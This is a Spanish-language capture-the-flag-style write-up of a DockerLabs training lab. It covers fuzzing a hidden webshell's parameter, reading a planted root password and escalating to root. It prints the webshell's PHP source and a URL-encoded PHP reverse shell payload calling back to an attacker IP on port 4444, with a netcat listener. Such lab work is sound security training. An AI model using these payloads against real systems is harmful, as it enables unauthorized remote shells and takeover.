# Write-up: DockerLabs => whereismywebshell
**Dificultad:** Fácil  
**Fecha:** 05/07/2025  

## Aprendizaje Obtenido:
* Reforzar la explotación web mediante el uso y manipulación de una webshell.
* Implementación del diccionario `SecLists` para fuzzing y enumeración.
* Ejecución de comandos remotos codificados en URL para asegurar su correcta interpretación.
* Uso de páginas online para la generación de reverse shells como `tex2e.github.io` y `revshells.com`.
* Edición y codificación/decodificación de payloads con herramientas como `dencode.com`.
* Comprender la importancia de `-i` en las reverse shells para obtener interactividad.

---

## Proceso de Explotación:

### 1. Reconocimiento de Puertos y Servicios (Nmap)

Realizamos un escaneo de puertos, servicios y sistema operativo para obtener información inicial del objetivo.

`sudo nmap -sSV -O --open 172.17.0.2`

**Resultados:**

`80/tcp open  http    Apache httpd 2.4.57 ((Debian))`  
`OS: Linux 4.X|5.X`  

Se confirma que el servidor web Apache está corriendo en el puerto 80 sobre un sistema operativo Linux (Debian).

### 2\. Enumeración Web (Inspección Manual y Gobuster)

Ingresamos a la página web (`http://172.17.0.2`), que resulta ser una academia de inglés. Durante la inspección manual del código y contenido de la página, se encontró una pista importante al final del sitio:

  * **Pista:** "¡Contáctanos hoy mismo para más información sobre nuestros programas de enseñanza de inglés\!. Guardo un secretito en /tmp ;)"

Luego, utilizamos `gobuster` para la enumeración de directorios y archivos ocultos en el servidor web.

`gobuster dir -u [http://172.17.0.2](http://172.17.0.2) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -q -b 404,403`

**Resultados de Gobuster:**

  * `/shell.php`
  * `/warning.html`

### 3\. Confirmación de Webshell y Búsqueda de Parámetro

Accedimos a `http://172.17.0.2/warning.html` y encontramos el siguiente mensaje:

  * **Mensaje:** "Esta web ha sido atacada por otro hacker, pero su webshell tiene un parámetro que no recuerdo..."

Al intentar acceder directamente a `/shell.php`, la página aparecía en blanco, lo que confirmaba la necesidad de un parámetro para que la webshell se ejecutara. Procedimos a usar `ffuf` para fuzzear el nombre del parámetro.

`ffuf -u [http://172.17.0.2/shell.php?FUZZ=id](http://172.17.0.2/shell.php?FUZZ=id) -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -mc 200,301`

**Resultado de Ffuf:**

  * El parámetro correcto es: `parameter`

Con el parámetro encontrado, confirmamos la ejecución de la webshell enviando un comando simple a través de la URL:

`[http://172.17.0.2/shell.php?parameter=id](http://172.17.0.2/shell.php?parameter=id)`

**Resultado de la ejecución del comando `id`:**

`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Esto confirmó que la webshell estaba funcionando y que estábamos ejecutando comandos como el usuario `www-data`.

### 5\. Uso de la Webshell para Enumeración

Dado que la webshell ya estaba funcional, pudimos ejecutar comandos directamente desde la URL del navegador usando la sintaxis:

`[http://172.17.0.2/shell.php?parameter=COMANDO](http://172.17.0.2/shell.php?parameter=COMANDO)`

### 6\. Probando Comandos y Buscando Pistas

Realizamos una serie de comandos para enumerar el sistema:

  * **`whoami`**:
      * **Resultado:** `www-data`
  * **`pwd`**:
      * **Resultado:** `/var/www/html`
  * **`ls`**: Listamos el contenido del directorio web.
      * **Resultado:**
        ```
        clase_ingles.jpg
        escuela.jpg
        index.html
        shell.php
        warning.html
        ```
  * **`cat shell.php`**: Para entender cómo la webshell procesa los comandos.
      * **Resultado:**
        ```php
        <?php echo "
        " . shell_exec($_REQUEST['parameter']) . "
        "; ?>
        ```
        Esto confirma que la shell usa `shell_exec()` y el parámetro `parameter` de la petición HTTP.
  * **`find / -perm -4000 -type f 2>/dev/null`**: Buscamos archivos con el bit SUID set, posibles vías de escalada de privilegios.
      * **Resultados:**
        ```
        /usr/bin/su
        /usr/bin/chfn
        /usr/bin/newgrp
        /usr/bin/gpasswd
        /usr/bin/passwd
        /usr/bin/umount
        /usr/bin/mount
        /usr/bin/chsh
        ```
        Aunque se encontraron binarios SUID comunes, ninguno resultó directamente explotable en GTFOBins para una escalada trivial.
  * **`ls -la /tmp`**: Recordando la pista de la web, enumeramos el directorio `/tmp`.
      * **Resultados:**
        ```
        total 12
        drwxrwxrwt 1 root root 4096 Jul  5 06:21 .
        drwxr-xr-x 1 root root 4096 Jul  5 06:21 ..
        -rw-r--r-- 1 root root   21 Apr 12  2024 .secret.txt
        ```
        ¡Encontramos un archivo `.secret.txt` propiedad de `root`\!
  * **`cat /tmp/.secret.txt`**: Leímos el contenido del archivo secreto.
      * **Resultado:**
        ```
        contraseñaderoot123
        ```
        ¡Obtuvimos la contraseña del usuario `root`\!

### 7\. Establecimiento de una Reverse Shell Interactiva

Para facilitar la interacción con el servidor, decidimos obtener una reverse shell interactiva.

  * **Listener en Kali:**

    `nc -lvnp 4444`

  * **Payload inicial (generado por `revshells.com` para PHP, pero no interactivo):**

    `php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.146.132%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27`

    Este payload, al ser ejecutado, no proporcionó una shell interactiva debido a la ausencia de `-i` para `/bin/sh`.

  * **Payload corregido (agregando `-i` para interactividad):**

    `php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.146.132%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27`

    **URL completa utilizada:**
    `http://172.17.0.2/shell.php?parameter=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.146.132%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27`

    Al ejecutar este payload, se obtuvo una reverse shell interactiva exitosamente en nuestra máquina Kali.

  * **Recomendaciones de herramientas para Reverse Shells y Encoding:**

      * Generador de Reverse Shells: [https://tex2e.github.io/reverse-shell-generator/index.html](https://tex2e.github.io/reverse-shell-generator/index.html) y [https://www.revshells.com/](https://www.revshells.com/)
      * Encoder/Decoder de URL: [https://dencode.com/en/](https://dencode.com/en/)

### 8\. Escalada de Privilegios a Root

Una vez dentro del servidor con la reverse shell como `www-data`, utilizamos la contraseña de `root` encontrada para escalar privilegios.

  * En la terminal de Kali (donde teníamos la reverse shell):
    `su root`  
    Se nos solicitó la contraseña, e ingresamos: `contraseñaderoot123`

### 9\. Verificación de Root

Confirmamos que la escalada de privilegios fue exitosa:

> `whoami` = `root`
